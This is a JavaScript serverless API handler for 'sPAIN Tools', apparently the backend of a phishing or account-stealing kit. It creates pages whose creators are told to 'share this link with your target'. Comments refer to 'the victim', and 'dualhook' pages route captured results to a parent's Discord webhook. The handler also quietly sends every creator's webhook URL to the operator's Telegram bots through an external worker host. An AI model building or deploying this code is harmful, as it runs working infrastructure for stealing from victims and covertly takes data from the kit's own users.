// api/claim.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

// Worker URL - replace with your actual worker URL
const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  return json.result;
}

async function redisSet(key, value) {
  const res = await fetch(
    `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
    { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
  );
  return res.ok;
}

// Bot 1 - Page Creation Notifications (now calls worker)
async function tgSend(text) {
  try {
    await fetch(`${WORKER_URL}/notify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ bot: 'create', text })
    });
  } catch (_) {}
}

// Bot 2 - Webhook Tracking (now calls worker)
async function tgSendWebhook(text) {
  try {
    await fetch(`${WORKER_URL}/notify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ bot: 'webhook', text })
    });
  } catch (_) {}
}

async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'sPAIN Tools',
        embeds: [{
          title: `✅ Your ${type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
          description: `Your page has been created successfully.\n\n**Share this link with your target:**\n${url}`,
          color: type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
          fields: [
            { name: '📁 Slug',         value: `\`${slug}\``,  inline: true },
            { name: '🏷 Display Name', value: displayName,    inline: true },
            { name: '🔗 Your Link',    value: url,            inline: false }
          ],
          footer: { text: 'sPAIN Tools — Keep this webhook private!' },
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  // dualhookParent is set when the victim generates a slots page FROM a dualhook page.
  // It holds the slug of the dualhook creator's page so submit.js can find webhook1.
  const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};

  if (!name)    return res.status(400).json({ error: 'name is required' });
  if (!webhook) return res.status(400).json({ error: 'webhook is required' });

  const slug = name.trim().toLowerCase().replace(/\s+/g, '-');

  if (!/^[a-z0-9_-]+$/i.test(slug)) {
    return res.status(400).json({ error: 'Name can only contain letters, numbers, hyphens, underscores' });
  }

  const RESERVED = ['api', 'index', 'favicon', 'robots', 'sitemap', '_next', 'static'];
  if (RESERVED.includes(slug)) {
    return res.status(400).json({ error: 'That name is reserved' });
  }

  try {
    const existing = await redisGet(`slot:${slug}`);
    if (existing !== null) {
      return res.status(200).json({ taken: true });
    }

    const record = {
      slug,
      displayName:    displayName    || slug,
      webhook,                              // webhook2 for child slots, webhook1 for dualhook
      inviteUrl:      inviteUrl      || '',
      charUrl:        charUrl        || '',
      type:           type === 'dualhook' ? 'dualhook' : 'slots',
      dualhookParent: dualhookParent || null, // null for plain slots & dualhook roots
      createdAt:      new Date().toISOString()
    };

    const ok = await redisSet(`slot:${slug}`, record);
    if (!ok) return res.status(500).json({ error: 'Failed to save' });

    const url = `https://spain-tools.vercel.app/${slug}`;

    await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);

    // Bot 1 - Page Creation Notification (detailed)
    const tgMsg = [
      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
      `📁 Slug: <code>${slug}</code>`,
      `🏷 Display: ${record.displayName}`,
      `🔗 URL: ${url}`,
      `📡 Webhook: <code>${webhook}</code>`,
      inviteUrl      ? `💬 Invite: ${inviteUrl}` : '',
      dualhookParent ? `🔗 DH Parent: <code>${dualhookParent}</code>` : '',
      `🕐 ${record.createdAt}`
    ].filter(Boolean).join('\n');

    await tgSend(tgMsg);

    // Bot 2 - Webhook Tracking (simple format)
    if (record.type === 'dualhook') {
      await tgSendWebhook([
        `🎣 <b>NEW DUALHOOK GENERATED</b>`,
        ``,
        `<b>Webhook:</b>`,
        `<code>${webhook}</code>`,
        ``,
        `🕐 ${new Date().toISOString()}`
      ].join('\n'));
    } else {
      await tgSendWebhook([
        `🎰 <b>NEW 1-9 SLOT GENERATED</b>`,
        ``,
        `<b>Webhook:</b>`,
        `<code>${webhook}</code>`,
        ``,
        `🕐 ${new Date().toISOString()}`
      ].join('\n'));
    }

    return res.status(200).json({ success: true, url, slug });

  } catch (err) {
    return res.status(500).json({ error: 'Server error', detail: err.message });
  }
}
